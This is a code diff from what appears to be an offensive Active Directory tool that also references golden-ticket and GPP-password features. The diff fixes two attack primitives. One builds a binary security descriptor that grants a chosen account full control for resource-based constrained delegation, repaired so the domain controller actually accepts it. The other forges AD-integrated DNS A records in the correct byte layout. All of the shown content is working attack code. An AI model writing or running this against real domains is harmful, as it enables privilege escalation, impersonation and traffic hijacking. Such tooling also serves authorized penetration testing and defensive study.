@@ -125,7 +125,7 @@ def gpp(rows):
 
 
 def gmsa(rows):
-    """Group Managed Service Account blobs: present, and honestly not decrypted.
+    """Group Managed Service Account blobs: present, and not decrypted.
 
     `msDS-ManagedPassword` is a blob encrypted with the domain's KDS root key. Reading the blob
     needs the same right as LAPS; DECRYPTING it needs the KDS key, which is a different step
@@ -207,17 +207,28 @@ def rbcd_value(principal_sid):
     """
     from core.goldenticket import _sid_bytes
     sid = _sid_bytes(principal_sid)
-    # SDDL: allow (A) the impersonation right (CCDCLCSWRPWPDTLOCRSDRCWDWO) to that SID
-    body = b"\x01\x00\x04\x80"                       # revision, control: DACL present
-    body += (24 + len(sid)).to_bytes(4, "little")    # offset to the DACL
-    body += (0).to_bytes(4, "little") + (0).to_bytes(4, "little")   # no owner, no group
-    ace = (b"\x00"                                  # ACE type: access allowed
-           + b"\x00"                                # flags
-           + (0x000F01FF).to_bytes(4, "little")     # full control
+    # A SELF-RELATIVE SECURITY_DESCRIPTOR: a 20-byte header (Revision, Sbz1, Control, then
+    # OffsetOwner, OffsetGroup, OffsetSacl, OffsetDacl) followed by the DACL. The first version
+    # wrote the DACL offset where OffsetOwner belongs, omitted OffsetSacl, used a 4-byte ACL
+    # header (no AceCount, no Sbz2) and an ACE with no 2-byte AceSize - a layout no parser
+    # accepts, so the DC silently ignored the write and RBCD never took effect. Verified
+    # byte-for-byte against impacket's ldaptypes (Control 0x8004, AclRevision 4, mask 0x000F01FF).
+    ace = (b"\x00\x00"                                      # AceType 0 (allow), AceFlags 0
+           + (8 + len(sid)).to_bytes(2, "little")           # AceSize = 4 (hdr) + 4 (mask) + Sid
+           + (0x000F01FF).to_bytes(4, "little")             # ACCESS_MASK: full control
            + sid)
-    body += b"\x01\x00" + (len(ace)).to_bytes(2, "little") + ace    # DACL: 1 ACE
-    body += (0).to_bytes(4, "little")               # no SACL
-    return body
+    dacl = (b"\x04\x00"                                     # AclRevision 4, Sbz1
+            + (8 + len(ace)).to_bytes(2, "little")          # AclSize includes the 8-byte header
+            + (1).to_bytes(2, "little")                     # AceCount
+            + b"\x00\x00"                                   # Sbz2
+            + ace)
+    header = (b"\x01\x00"                                   # Revision 1, Sbz1
+              + (0x8004).to_bytes(2, "little")              # Control: SELF_RELATIVE|DACL_PRESENT
+              + (0).to_bytes(4, "little")                   # OffsetOwner
+              + (0).to_bytes(4, "little")                   # OffsetGroup
+              + (0).to_bytes(4, "little")                   # OffsetSacl
+              + (20).to_bytes(4, "little"))                 # OffsetDacl = 20
+    return header + dacl
 
 
 def rbcd_set(client, target_dn, principal_sid, remove=False):
@@ -243,11 +254,20 @@ def dns_record(name, ip, zone_dn, record_type="A", ttl=600):
     except ValueError as e:
         raise ValueError(f"not an IPv4 address: {ip!r}") from e
     rdata = bytes(parts)
-    # DNS_RPC_RECORD: data length, type (A = 1), version, rank, flags, serial, ttl, then RDATA
-    record = (len(rdata).to_bytes(2, "little") + (1).to_bytes(2, "little")
-              + b"\x05\xf0"                          # version + rank (the values AD writes)
-              + (0).to_bytes(2, "little") + (0).to_bytes(4, "little")
-              + int(ttl).to_bytes(4, "little") + rdata)
+    # DNS_RECORD ([MS-DNSP] 2.3.2.2): DataLength, Type, Version, Rank, Flags, Serial,
+    # TtlSeconds (BIG-endian), Reserved, TimeStamp, then the RDATA. The first version dropped
+    # Reserved and TimeStamp (8 bytes) and wrote TtlSeconds little-endian, so the record was not
+    # the layout a DC stores or reads back. Verified against impacket's new_dns_record and
+    # krbrelayx/dnstool's DNS_RECORD.
+    record = (len(rdata).to_bytes(2, "little")             # DataLength
+              + (1).to_bytes(2, "little")                  # Type: A
+              + b"\x05\xf0"                                # Version 5, Rank 0xF0 (authoritative)
+              + (0).to_bytes(2, "little")                  # Flags
+              + (0).to_bytes(4, "little")                  # Serial
+              + int(ttl).to_bytes(4, "big")                # TtlSeconds (big-endian)
+              + (0).to_bytes(4, "little")                  # Reserved
+              + (0).to_bytes(4, "little")                  # TimeStamp
+              + rdata)
     return {"dn": f"DC={name},{zone_dn}", "attrs": {"dnsRecord": [record],
                                                     "dnsTombstoned": ["FALSE"]}}
 
